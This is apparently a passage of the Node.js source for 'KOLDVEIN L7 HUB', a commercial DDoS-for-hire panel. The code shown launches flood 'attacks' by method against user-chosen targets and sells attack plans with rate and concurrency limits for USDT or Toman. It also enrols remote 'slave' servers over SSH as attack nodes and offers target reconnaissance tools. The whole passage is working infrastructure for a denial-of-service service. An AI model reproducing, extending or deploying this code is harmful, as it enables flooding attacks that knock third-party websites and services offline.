    cache: method==='cflood' ? $('#cfloodCacheInput').checked : false,
  };

  var b=$('#startBtn');b.disabled=true;
  try{
    var res=await api('/api/sessions',{method:'POST',body:JSON.stringify(payload)});
    var n=(res.sessions||[]).length;
    showToast('Deployed '+n+' attack'+(n===1?'':'s'));
    loadSessions();
  }catch(ex){
    if(ex.cooldownRemaining!==undefined){cooldownRemaining=ex.cooldownRemaining;renderCooldown();}
    err.textContent=ex.message;
    showToast('Error: '+ex.message);
  }finally{b.disabled=false;}
}

var plansCache=[],currentOrder=null,pendingOrder=null,orderPoll=null,checkCooldownUntil=0,plansMeta={};
async function loadPlans(){
  var c=$('#plansList');
  c.innerHTML='<div class="empty-state"><span class="spinner"></span>Loading…</div>';
  try{
    var d=await api('/api/plans');
    plansCache=d.plans||[];plansMeta=d.providers||{};
    if(!plansMeta.usdt&&!plansMeta.iran){c.innerHTML='<div class="empty-state">No payment providers configured.</div>';return;}
    c.innerHTML=plansCache.map(function(p){
      var feats=(p.features||[]).map(function(f){return '<li>'+esc(f)+'</li>';}).join('');
      var usdtBtn=plansMeta.usdt?'<button class="buy-btn" data-plan="'+esc(p.id)+'" data-provider="usdt">$'+Number(p.price).toFixed(2)+' USDT</button>':'<button class="buy-btn" disabled>Global unavailable</button>';
      var iranBtn=plansMeta.iran?'<button class="buy-btn iran" data-plan="'+esc(p.id)+'" data-provider="iran">'+Number(p.iranPrice).toLocaleString()+' Toman</button>':'<button class="buy-btn" disabled>Iran unavailable</button>';
      return '<div class="plan-card"><span class="plan-tag">'+esc(p.tagline||p.name)+'</span>'
        +'<div class="plan-name">'+esc(p.name)+'</div>'
        +'<div class="plan-price-row"><div class="plan-price">$'+Number(p.price).toFixed(2)+'</div>'
        +'<div class="plan-price iran">'+Number(p.iranPrice).toLocaleString()+' <small style="font-size:11px;">T</small></div></div>'
        +'<ul>'+feats+'</ul><div class="buy-row">'+usdtBtn+iranBtn+'</div></div>';
    }).join('');
    c.querySelectorAll('.buy-btn[data-provider]').forEach(function(b){
      b.addEventListener('click',function(){startPurchase(b.dataset.plan,b.dataset.provider);});
    });
  }catch(e){c.innerHTML='<div class="empty-state">Failed: '+esc(e.message)+'</div>';}
}

async function startPurchase(planId,provider){
  if(!currentUser){showToast('Sign in first');return;}
  if(currentUser.role==='admin'){showToast('Admin has access');return;}
  if(pendingOrder){showToast('Cancel pending order first');renderPendingBanner();return;}
  try{
    var d=await api('/api/orders',{method:'POST',body:JSON.stringify({planId:planId,provider:provider})});
    currentOrder=d.order;pendingOrder=d.order;
    renderPendingBanner();renderOrder();
    if(orderPoll)clearInterval(orderPoll);
    orderPoll=setInterval(refreshOrder,5000);
  }catch(e){
    if(e.code==='PENDING_EXISTS'&&e.pendingOrder){pendingOrder=e.pendingOrder;renderPendingBanner();showToast('Cancel pending first');return;}
    showToast('Error: '+e.message);
  }
}

async function loadPendingOrder(){
  if(!currentUser){pendingOrder=null;renderPendingBanner();return;}
  try{var d=await api('/api/orders/pending');pendingOrder=d.pendingOrder||null;}catch(e){pendingOrder=null;}
  renderPendingBanner();
  if(pendingOrder){currentOrder=pendingOrder;renderOrder();}
}

function renderPendingBanner(){
  var el=$('#pendingOrderBanner');
  if(!pendingOrder){el.classList.add('hide');return;}
  var isIran=pendingOrder.provider==='iran';
  var amt=isIran?Number(pendingOrder.payAmount).toLocaleString()+' T':pendingOrder.payAmount+' USDT';
  el.classList.remove('hide');
  el.innerHTML='<div style="flex:1;"><b>'+esc(pendingOrder.planName)+'</b> · '+esc(amt)+'</div>'
    +'<div style="display:flex;gap:8px;"><button class="pb-open" id="pbOpenBtn">View</button>'
    +'<button id="pbCancelBtn">Cancel</button></div>';
  $('#pbOpenBtn').addEventListener('click',function(){currentOrder=pendingOrder;renderOrder();});
  $('#pbCancelBtn').addEventListener('click',async function(){
    if(!confirm('Cancel pending order?'))return;
    try{await api('/api/orders/'+encodeURIComponent(pendingOrder.id)+'/cancel',{method:'POST'});showToast('Cancelled');pendingOrder=null;currentOrder=null;$('#planOrder').classList.add('hide');if(orderPoll){clearInterval(orderPoll);orderPoll=null;}renderPendingBanner();loadOrderHistory();}catch(e){showToast(e.message);}
  });
}

function renderOrder(){
  var w=$('#planOrder');if(!w||!currentOrder)return;
  w.classList.remove('hide');
  var isIran=currentOrder.provider==='iran';
  var stepLabel=$('#planOrderStepsLabel'),stepsList=$('#planOrderStepsList');
  var title=$('#planOrderTitle'),amtEl=$('#planPayAmount'),statusEl=$('#planOrderStatus');
  var amtLabel=$('#planAmountLabel'),statusLabel=$('#planStatusLabel');
  var walletBlock=$('#planWalletBlock'),donitoBlock=$('#planDonitoBlock');
  var copyAmtBtn=$('#copyAmountBtn'),openBtn=$('#openDonitoBtn');
  var checkBtn=$('#checkOrderBtn'),cancelBtn=$('#cancelOrderBtn');
  var eyebrow=$('#planOrderEyebrow');
  if(isIran){
    var t=currentOrder.i18n||{};
    w.classList.add('rtl');w.setAttribute('dir','rtl');
    eyebrow.textContent=t.completePayment||'تکمیل پرداخت';
    title.textContent=t.payWithDonito||('پرداخت — '+currentOrder.planName);
    stepLabel.textContent=t.followSteps||'مراحل';
    stepsList.innerHTML=(t.steps||[]).map(function(s){return '<li>'+esc(s)+'</li>';}).join('');
    amtLabel.textContent=t.amountToSend||'مبلغ';
    amtEl.textContent=Number(currentOrder.payAmount).toLocaleString()+' تومان';
    copyAmtBtn.textContent=t.copyAmount||'کپی مبلغ';
    openBtn.innerHTML='باز کردن دونیتو <span>→</span>';
    checkBtn.textContent=t.checkNow||'بررسی';
    cancelBtn.textContent=t.cancel||'لغو';
    statusLabel.textContent=t.orderStatus||'وضعیت';
    statusEl.textContent=(t.waiting||'در انتظار…').replace('{id}',currentOrder.id);
    walletBlock.classList.add('hide');donitoBlock.classList.remove('hide');
  }else{
    w.classList.remove('rtl');w.removeAttribute('dir');
    eyebrow.textContent='COMPLETE PAYMENT';
    title.textContent='Send USDT — '+currentOrder.planName;
    stepLabel.textContent='Follow';
    stepsList.innerHTML='<li>Copy wallet below.</li><li>Send exactly <b>'+currentOrder.payAmount+' USDT (TRC20)</b>.</li><li>Click <b>Check now</b>.</li>';
    amtLabel.textContent='Amount';
    amtEl.textContent=currentOrder.payAmount+' USDT';
    copyAmtBtn.textContent='Copy amount';
    openBtn.innerHTML='Open Donito <span>→</span>';
    checkBtn.textContent='Check now';
    cancelBtn.textContent='Cancel';
    statusLabel.textContent='Order';
    statusEl.textContent='Waiting…';
    $('#planWallet').value=currentOrder.wallet||'';
    walletBlock.classList.remove('hide');donitoBlock.classList.add('hide');
  }
  w.scrollIntoView({behavior:'smooth',block:'center'});
}

async function refreshOrder(){
  if(!currentOrder)return;
  try{
    var d=await api('/api/orders/'+currentOrder.id);
    var o=d.order;if(!o)return;
    var st=$('#planOrderStatus');
    if(o.status==='pending'){st.textContent='Waiting…';}
    else if(o.status==='paid'){st.innerHTML='<span style="color:var(--accent-cyan);">Payment detected — delivering…</span>';}
    else if(o.status==='delivered'){
      st.innerHTML='<span style="color:var(--success);">Plan activated</span>';
      if(orderPoll){clearInterval(orderPoll);orderPoll=null;}
      pendingOrder=null;renderPendingBanner();
      setTimeout(async function(){await checkAuth();loadOrderHistory();},1500);
    }else if(o.status==='error'){st.innerHTML='<span style="color:var(--danger);">Error: '+esc(o.error||'failed')+'</span>';}
    else if(o.status==='cancelled'){st.textContent='Cancelled';}
  }catch(e){}
}

async function checkOrderNow(){
  if(!currentOrder)return;
  var now=Date.now();
  if(now<checkCooldownUntil){showToast('Wait '+(Math.ceil((checkCooldownUntil-now)/1000))+'s');return;}
  try{await api('/api/orders/'+currentOrder.id+'/check',{method:'POST'});checkCooldownUntil=now+5000;}
  catch(e){if(e.retryAfterMs)checkCooldownUntil=now+e.retryAfterMs;}
  refreshOrder();
}

async function cancelCurrentOrder(){
  if(!currentOrder)return;
  if(!confirm('Cancel order?'))return;
  try{await api('/api/orders/'+currentOrder.id+'/cancel',{method:'POST'});showToast('Cancelled');pendingOrder=null;currentOrder=null;$('#planOrder').classList.add('hide');if(orderPoll){clearInterval(orderPoll);orderPoll=null;}renderPendingBanner();loadOrderHistory();}catch(e){showToast(e.message);}
}

async function loadOrderHistory(){
  var w=$('#planHistory'),l=$('#planHistoryList');
  try{
    var d=await api('/api/orders');
    if(!d.orders||!d.orders.length){w.classList.add('hide');return;}
    w.classList.remove('hide');
    l.innerHTML=d.orders.map(function(o){
      var when=new Date(o.createdAt).toLocaleString();
      return '<div class="order-row"><div><b>'+esc(o.planName)+'</b><div class="order-meta">'+esc(o.provider)+' · '+esc(o.id)+' · '+when+'</div></div><span class="order-status '+esc(o.status)+'">'+esc(o.status)+'</span></div>';
    }).join('');
  }catch(e){w.classList.add('hide');}
}

async function loadUsers(){
  try{
    var d=await api('/api/users');
    var c=$('#users');
    c.innerHTML=d.users.map(function(u){
      return '<div class="user-row" data-u="'+esc(u.username)+'">'
        +'<div><b>'+esc(u.username)+'</b><div class="meta">'+esc(u.role)+' · '+esc(u.planName||'—')+' · rate:'+lim((u.limits||{}).maxRate)+' · conc:'+lim((u.limits||{}).maxConcurrent)+' · '+(u.expiresAt?('exp:'+String(u.expiresAt).slice(0,10)):'never')+'</div></div>'
        +'<div class="row-actions"><button class="del-btn danger">Delete</button></div></div>';
    }).join('');
    c.querySelectorAll('.user-row').forEach(function(row){
      var u=row.dataset.u;
      row.querySelector('.del-btn').addEventListener('click',async function(){
        if(!confirm('Delete '+u+'?'))return;
        try{await api('/api/users/'+encodeURIComponent(u),{method:'DELETE'});showToast('Deleted');loadUsers();}catch(e){showToast(e.message);}
      });
    });
  }catch(e){}
}

async function loadGlobalLimits(){
  try{var d=await api('/api/admin/global-limits');$('#globalMaxRate').value=d.maxRate||0;}catch(e){}
}

async function loadBlacklist(){
  try{
    var d=await api('/api/blacklist');
    var c=$('#blacklistList');
    if(!d.blacklist||!d.blacklist.length){c.innerHTML='<div class="empty-state">No blocked targets.</div>';return;}
    c.innerHTML=d.blacklist.map(function(p){
      return '<div class="bl-item"><span>'+esc(p)+'</span><button data-p="'+esc(p)+'">Remove</button></div>';
    }).join('');
    c.querySelectorAll('button').forEach(function(b){
      b.addEventListener('click',async function(){
        try{await api('/api/blacklist/'+encodeURIComponent(b.dataset.p),{method:'DELETE'});loadBlacklist();}catch(e){showToast(e.message);}
      });
    });
  }catch(e){}
}

async function loadSlaves(){
  try{
    var d=await api('/api/admin/slaves');
    var c=$('#slavesList');
    if(!d.slaves||!d.slaves.length){c.innerHTML='<div class="empty-state">No slaves. Add one below.</div>';return;}
    c.innerHTML=d.slaves.map(function(s){
      var statusClass=s.status||'offline';
      var stageInfo=s.bootstrapStage?' <span style="color:var(--accent-cyan);">['+esc(s.bootstrapStage)+']</span>':'';
      var errInfo=s.lastError?' · <span style="color:var(--danger);">'+esc(s.lastError)+'</span>':'';
      var isBootstrapping=(s.status==='bootstrapping');
      var updateBtn=isBootstrapping
        ? '<button class="update" data-id="'+esc(s.id)+'" type="button" disabled>Updating…</button>'
        : '<button class="update" data-id="'+esc(s.id)+'" type="button">Update</button>';
      return '<div class="slave-item"><div><b>'+esc(s.name)+'</b>'
        +'<div class="meta">'+esc(s.ip)+':'+s.port+' · '+s.cores+'c · '+s.ramMb+'MB · '+s.threads+'t · <span class="status '+statusClass+'">'+esc(s.status)+'</span>'+stageInfo+errInfo+'</div></div>'
        +'<div class="btns">'+updateBtn+'<button class="danger" data-id="'+esc(s.id)+'">Remove</button></div></div>';
    }).join('');
    c.querySelectorAll('button.danger').forEach(function(b){
      b.addEventListener('click',async function(){
        if(!confirm('Remove slave?'))return;
        try{await api('/api/admin/slaves/'+b.dataset.id,{method:'DELETE'});showToast('Removed');loadSlaves();}catch(e){showToast(e.message);}
      });
    });
    c.querySelectorAll('button.update').forEach(function(b){
      b.addEventListener('click',async function(){
        b.disabled=true;
        var origText=b.textContent;
        b.textContent='Updating…';
        try{
          var res=await api('/api/admin/slaves/'+b.dataset.id+'/update',{method:'POST'});
          showToast(res.message || 'Update started');
          setTimeout(loadSlaves,3000);
          setTimeout(loadSlaves,10000);
          setTimeout(loadSlaves,30000);
        }catch(e){
          if(e.runningSessions&&e.runningSessions.length){
            showToast('Terminate running sessions first');
          }else{
            showToast('Error: '+e.message);
          }
          b.disabled=false;b.textContent=origText;
        }
      });
    });
  }catch(e){}
}

async function runPing(){
  var h=($('#pingHost').value||'').trim();var o=$('#pingOutput');
  if(!h){o.innerHTML='<span style="color:var(--danger);">Host required.</span>';return;}
  o.innerHTML='<div><span class="spinner"></span>Pinging…</div>';
  try{var d=await api('/api/tools/ping',{method:'POST',body:JSON.stringify({host:h})});
    o.innerHTML=d.results.map(function(r){return r.ok?'<div style="color:var(--success);">Reply from '+esc(d.host)+': '+r.ms+'ms</div>':'<div style="color:var(--danger);">Timeout ('+esc(r.error)+')</div>';}).join('')+'<div style="margin-top:10px;color:var(--accent-cyan);">Sent='+d.count+', Received='+d.received+', Lost='+d.lost+'</div>';
  }catch(e){o.innerHTML='<span style="color:var(--danger);">'+esc(e.message)+'</span>';}
}
async function runHttps(){
  var h=($('#httpsHost').value||'').trim().replace(/^[a-z]+:\/\//i,'').replace(/\/.*$/,'');
  var o=$('#httpsOutput');
  o.innerHTML='<div><span class="spinner"></span>Checking…</div>';
  try{var d=await api('/api/tools/https',{method:'POST',body:JSON.stringify({host:h})});
    o.innerHTML=d.ok?'<div style="color:var(--success);font-weight:700;">ONLINE</div><div>Status: '+d.status+'</div><div>'+d.ms+'ms</div>':'<div style="color:var(--danger);font-weight:700;">OFFLINE</div><div>'+esc(d.error||'fail')+'</div>';
  }catch(e){o.innerHTML='<span style="color:var(--danger);">'+esc(e.message)+'</span>';}
}
async function runAsn(){
  var h=($('#asnHost').value||'').trim().replace(/^[a-z]+:\/\//i,'').replace(/\/.*$/,'');
  var o=$('#asnOutput');
  o.innerHTML='<div><span class="spinner"></span>Looking up…</div>';
  try{var d=await api('/api/tools/asn',{method:'POST',body:JSON.stringify({host:h})});
    o.innerHTML='<div style="color:var(--success);font-weight:700;">'+esc(d.host)+'</div><div>IP: '+esc(d.ip)+'</div><div>ASN: '+esc(d.asn||'—')+' · '+esc(d.asName||'—')+'</div><div>Org: '+esc(d.org||'—')+'</div><div>Country: '+esc(d.country||'—')+'</div>';
  }catch(e){o.innerHTML='<span style="color:var(--danger);">'+esc(e.message)+'</span>';}
}

function bind(){
  $('#loginForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var err=$('#loginErr');err.textContent='';
    var f=new FormData(e.target);
    try{
      var d=await api('/api/login',{method:'POST',body:JSON.stringify({
        username:f.get('username'),password:f.get('password'),captchaAnswer:Number(f.get('captchaAnswer')),
      })});
      currentUser=d.user;updateAuth();updateRole();applyLimits();
      await loadMethods();
      showToast('Signed in');setPage('hub');
    }catch(ex){err.textContent=ex.message;loadCaptcha('login');}
  });
  $('#registerForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var err=$('#registerErr');err.textContent='';
    var f=new FormData(e.target);
    try{
      var d=await api('/api/register',{method:'POST',body:JSON.stringify({
        username:f.get('username'),password:f.get('password'),captchaAnswer:Number(f.get('captchaAnswer')),
      })});
      currentUser=d.user;updateAuth();updateRole();applyLimits();
      await loadMethods();
      showToast('Account created');setPage('hub');
    }catch(ex){err.textContent=ex.message;loadCaptcha('register');}
  });
  $('#captchaRefresh').addEventListener('click',function(){loadCaptcha('register');});
  $('#loginCaptchaRefresh').addEventListener('click',function(){loadCaptcha('login');});
  $('#toLoginLink').addEventListener('click',function(e){e.preventDefault();setPage('login');});
  $('#toRegisterLink').addEventListener('click',function(e){e.preventDefault();setPage('register');});
  $('#navLogout').addEventListener('click',async function(){
    try{await api('/api/logout',{method:'POST'});}catch(e){}
    currentUser=null;updateAuth();updateRole();setPage('hub');
  });
  $('#menu').addEventListener('click',function(){sidebar.classList.contains('open')?closeSidebar():openSidebar();});
  sidebarBackdrop.addEventListener('click',closeSidebar);
  $$('#sidebar button[data-page]').forEach(function(b){
    b.addEventListener('click',function(){setPage(b.dataset.page);});
  });
  $('#methodSelect').addEventListener('change',updateMethodFields);
  $('#launch').addEventListener('submit',startProcess);
  $('#refresh').addEventListener('click',function(){loadMethods();loadSessions();});
  $('#account').addEventListener('submit',async function(e){
    e.preventDefault();
    var m=$('#accountMsg');m.className='';m.textContent='';
    var f=new FormData(e.target);
    try{
      var d=await api('/api/account',{method:'POST',body:JSON.stringify({
        currentPassword:f.get('currentPassword'),
        newUsername:f.get('newUsername')||undefined,
        newPassword:f.get('newPassword')||undefined,
      })});
      currentUser=d.user;updateRole();
      m.className='ok';m.textContent=d.notification||'Updated.';
      e.target.reset();
    }catch(ex){m.className='err';m.textContent=ex.message;}
  });
  $('#createUser').addEventListener('submit',async function(e){
    e.preventDefault();
    var m=$('#userMsg');m.className='';m.textContent='';
    var f=new FormData(e.target);
    try{
      await api('/api/users',{method:'POST',body:JSON.stringify({
        username:f.get('username'),password:f.get('password'),
        maxDuration:Number(f.get('maxDuration')||0),
        maxRate:Number(f.get('maxRate')||0),
        maxConcurrent:Number(f.get('maxConcurrent')||0),
        cooldown:Number(f.get('cooldown')||0),
        expiresAt:f.get('expiresAt')||null,
        role:f.get('role')||'user',
      })});
      m.className='ok';m.textContent='Created.';
      e.target.reset();loadUsers();
    }catch(ex){m.className='err';m.textContent=ex.message;}
  });
  $('#globalLimitsForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var m=$('#globalLimitsMsg');m.className='';m.textContent='';
    var f=new FormData(e.target);
    try{
      await api('/api/admin/global-limits',{method:'PUT',body:JSON.stringify({maxRate:Number(f.get('maxRate')||0)})});
      m.className='ok';m.textContent='Saved.';
      await checkAuth();
    }catch(ex){m.className='err';m.textContent=ex.message;}
  });
  $('#addBlacklist').addEventListener('submit',async function(e){
    e.preventDefault();
    var m=$('#blacklistMsg');m.className='';m.textContent='';
    var f=new FormData(e.target);
    try{
      await api('/api/blacklist',{method:'POST',body:JSON.stringify({pattern:f.get('pattern')})});
      m.className='ok';m.textContent='Added.';
      e.target.reset();loadBlacklist();
    }catch(ex){m.className='err';m.textContent=ex.message;}
  });
  $('#authTypeSelect').addEventListener('change',function(){
    var k=this.value==='key';
    $('#passwordField').classList.toggle('hide',k);
    $('#keyField').classList.toggle('hide',!k);
  });
  $('#addSlaveForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var m=$('#addSlaveMsg');m.className='';m.textContent='';
    var f=new FormData(e.target);
    try{
      await api('/api/admin/slaves',{method:'POST',body:JSON.stringify({
        name:f.get('name'),ip:f.get('ip'),port:Number(f.get('port')||22),
        username:f.get('username'),
        authType:f.get('authType'),
        password:f.get('password')||undefined,
        privateKey:f.get('privateKey')||undefined,
        passphrase:f.get('passphrase')||undefined,
      })});
      m.className='ok';m.textContent='Added. Bootstrapping…';
      e.target.reset();loadSlaves();
      setTimeout(loadSlaves,5000);
      setTimeout(loadSlaves,15000);
      setTimeout(loadSlaves,45000);
      setTimeout(loadSlaves,120000);
    }catch(ex){m.className='err';m.textContent=ex.message;}
  });
  $('#refreshSlavesBtn').addEventListener('click',async function(){
    showToast('Checking slaves…');
    try{await api('/api/admin/slaves/health',{method:'POST'});loadSlaves();}catch(e){showToast(e.message);}
  });
  $('#toolPingBtn').addEventListener('click',function(){$('#toolPing').classList.remove('hide');$('#toolHttps').classList.add('hide');$('#toolAsn').classList.add('hide');});
  $('#toolHttpsBtn').addEventListener('click',function(){$('#toolHttps').classList.remove('hide');$('#toolPing').classList.add('hide');$('#toolAsn').classList.add('hide');});
  $('#toolAsnBtn').addEventListener('click',function(){$('#toolAsn').classList.remove('hide');$('#toolPing').classList.add('hide');$('#toolHttps').classList.add('hide');});
  $('#pingRunBtn').addEventListener('click',runPing);
  $('#httpsRunBtn').addEventListener('click',runHttps);
  $('#asnRunBtn').addEventListener('click',runAsn);
  $('#copyWalletBtn').addEventListener('click',function(){var el=$('#planWallet');if(el&&el.value)navigator.clipboard.writeText(el.value).then(function(){showToast('Copied');},function(){showToast('Copy failed');});});
  $('#copyAmountBtn').addEventListener('click',function(){if(currentOrder)navigator.clipboard.writeText(String(currentOrder.payAmount)).then(function(){showToast('Copied');},function(){showToast('Copy failed');});});
  $('#openDonitoBtn').addEventListener('click',function(){window.open('https://donito.me/privflood','_blank','noopener');});
  $('#checkOrderBtn').addEventListener('click',checkOrderNow);
  $('#cancelOrderBtn').addEventListener('click',cancelCurrentOrder);
}

async function boot(){
  bind();
  updateMethodFields();
  await checkAuth();
  if(currentUser){await loadMethods();}
  setPage('hub');
  setInterval(loadSessions,1200);
  setInterval(function(){if(currentUser&&currentUser.role==='admin'&&!settingsSection.classList.contains('hide')){loadSlaves();}},15000);
}
boot();
})();`;

function noCache(res, type, body) {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.type(type).send(body);
}
app.get('/',        (_req, res) => noCache(res, 'html', HTML));
app.get('/ui.js',   (_req, res) => noCache(res, 'application/javascript', UI_JS));
app.get('/ui.css',  (_req, res) => noCache(res, 'text/css', UI_CSS));

app.use((err, _req, res, _next) => { console.error(err); res.status(500).json({ error: 'Internal error.' }); });

function promptPayments(done) {
  if (!paymentsModule) return done();
  const needsWallet = !paymentsModule.isWalletConfigured();
  const needsDonito = !paymentsModule.isDonitoConfigured();
  if (!needsWallet && !needsDonito) { paymentsModule.startPoller(); return done(); }
  if (process.env.PAYMENTS_SKIP_PROMPT === '1') { paymentsModule.startPoller(); return done(); }
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  console.log('\n=== Payment setup (blank = skip) ===');
  const ask1 = () => {
    if (!needsWallet) return ask2();
    rl.question('TRC20 USDT wallet (T..., 34 chars): ', a => {
      const w = String(a || '').trim();
      if (w) { try { paymentsModule.setWallet(w); console.log('wallet saved'); } catch (e) { console.error(e.message); } }
      ask2();
    });
  };
  const ask2 = () => {
    if (!needsDonito) return fin();
    rl.question('Donito token (min 8 chars): ', a => {
      const t = String(a || '').trim();
      if (t) { try { paymentsModule.setDonitoToken(t); console.log('donito saved'); } catch (e) { console.error(e.message); } }
      fin();
    });
  };
  const fin = () => { rl.close(); paymentsModule.startPoller(); done(); };
  ask1();
}

async function boot() {
  backup.start();
  await reattachSessions().catch(e => console.error('[reattach]', e.message));
  setInterval(() => { slaves.healthCheckAll().catch(() => {}); }, 2 * 60 * 1000).unref();

  const server = app.listen(CONFIG.port, CONFIG.host, () => {
    console.log('\n  KOLDVEIN L7 HUB');
    console.log('  -> http://' + CONFIG.host + ':' + CONFIG.port);
    console.log('  data dir     : ' + CONFIG.dataDir);
    console.log('  hub dir      : ' + SCRIPT_DIR);
    console.log('  payments     : ' + (paymentsModule ? 'loaded' : 'NOT loaded'));
    console.log('  favicon      : ' + (faviconBuffer ? 'loaded (' + faviconBuffer.length + 'B)' : 'MISSING'));
    const methods = getMethodStatus();
    console.log('  methods      :');
    for (const m of methods) {
      console.log('    ' + (m.available ? '[OK]     ' : '[MISSING]') + ' ' + m.name.padEnd(20) + ' (' + m.file + ')');
    }
    const list = slaves.listSlaves();
    console.log('  slaves ready : ' + list.filter(s => s.status === 'ready').length + '/' + list.length);
    console.log('  total threads: ' + slaves.totalThreads());
    console.log('  backup       : running (2-min, keep 30)\n');
  });

  function shutdown(sig) {
    console.log('\n[hub] ' + sig);
    try { backup.stop(); } catch {}
    try { _auditStream.end(); } catch {}
    server.close(() => process.exit(0));
    setTimeout(() => process.exit(0), 2000).unref();
  }
  process.on('SIGINT', () => shutdown('SIGINT'));
  process.on('SIGTERM', () => shutdown('SIGTERM'));
}

promptPayments(() => boot());